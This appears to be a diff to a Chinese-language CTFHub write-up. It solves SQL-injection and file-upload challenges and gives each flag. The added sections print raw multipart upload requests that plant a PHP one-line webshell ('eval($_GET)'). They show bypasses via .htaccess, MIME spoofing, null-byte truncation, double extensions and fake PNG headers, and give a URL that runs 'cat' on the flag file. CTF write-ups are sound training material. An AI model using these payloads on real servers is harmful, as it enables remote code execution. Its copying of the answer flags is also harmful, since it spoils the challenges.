@@ -589,3 +589,120 @@ flag: `ctfhub{f79bdfdfaaf2bbc506f193fa}`
 ```
 -1 union select updatexml(1, concat(0x7e, (select substring(group_concat(flag), 21, 20) from flag), 0x7e), 1), 2
 ```
+
+flag: `ctfhub{b4d58c04c291bb402557bb70}`
+
+### 文件上传 - 无验证
+
+直接写个 php 一句话木马上传就行
+
+```
+http://challenge-ce68f5bafd33a92b.sandbox.ctfhub.com:10800/upload/index.php?x=echo `cat /var/www/html/flag_1648429041.php | base64`;
+```
+
+flag: `ctfhub{8c43bc94e39e9a8749eec390}`
+
+### 文件上传 - 前端验证
+
+拦截抓包改，或者改前端代码，都可以，然后剩下跟前面一样
+
+flag: `ctfhub{3db33dfdceaeab70c35c6893}`
+
+### 文件上传 - .htaccess
+
+```
+------WebKitFormBoundaryglP3qYgfAlD4p1Jg
+Content-Disposition: form-data; name="file"; filename=".htaccess"
+Content-Type: application/octet-stream
+
+<FilesMatch "\.asd$">
+	SetHandler application/x-httpd-php
+</FilesMatch>
+
+------WebKitFormBoundaryglP3qYgfAlD4p1Jg
+```
+
+flag: `ctfhub{5e91162d6d3f49c5114e25d0}`
+
+### 文件上传 - MIME 绕过
+
+```http
+------WebKitFormBoundaryc6sfnDqiBhfIrJJ3
+Content-Disposition: form-data; name="file"; filename="x.php"
+Content-Type: image/jpeg
+
+<?php eval($_GET['x']) ?>
+------WebKitFormBoundaryc6sfnDqiBhfIrJJ3
+```
+
+flag: `ctfhub{ecc138377657a7a7d85b5ffc}`
+
+### 文件上传 - 00 截断
+
+```http
+POST /?road=/var/www/html/upload/x.php%00 HTTP/1.1
+Host: challenge-5c8669b200ad04c7.sandbox.ctfhub.com:10800
+<omitted ...>
+
+
+------WebKitFormBoundary8acXxWBRTBOzGgbP
+Content-Disposition: form-data; name="file"; filename="file.jpg"
+Content-Type: image/jpeg
+
+<?php eval($_GET['x']) ?>
+------WebKitFormBoundary8acXxWBRTBOzGgbP
+Content-Disposition: form-data; name="submit"
+
+Submit
+------WebKitFormBoundary8acXxWBRTBOzGgbP--
+```
+
+flag: `ctfhub{f5ed51edabb7f16f4bb9cd05}`
+
+### 文件上传 - 双写后缀
+
+```http
+POST / HTTP/1.1
+Host: challenge-0a65a07548c11604.sandbox.ctfhub.com:10800
+<omitted ...>
+
+------WebKitFormBoundaryljnqMVE9VBBJvuzn
+Content-Disposition: form-data; name="file"; filename="x.pphphp"
+Content-Type: text/php
+
+<?php eval($_GET['x']) ?>
+
+------WebKitFormBoundaryljnqMVE9VBBJvuzn
+Content-Disposition: form-data; name="submit"
+
+Submit
+------WebKitFormBoundaryljnqMVE9VBBJvuzn--
+
+```
+
+flag: `ctfhub{cf7e972cb23bbb9a0770dd53}`
+
+### 文件上传 - 文件头检查
+
+```http
+POST / HTTP/1.1
+Host: challenge-fe8477ea88d15ae4.sandbox.ctfhub.com:10800
+
+<omitted ...>
+
+------WebKitFormBoundary6ojWZlkI6ODJKZ9u
+Content-Disposition: form-data; name="file"; filename="x.php"
+Content-Type: image/png
+
+PNG
+
+<?php eval($_GET['x']) ?>
+------WebKitFormBoundary6ojWZlkI6ODJKZ9u
+Content-Disposition: form-data; name="submit"
+
+Submit
+------WebKitFormBoundary6ojWZlkI6ODJKZ9u--
+
+```
+
+flag: `ctfhub{ba9f2968dc4d10b625658cf9}`
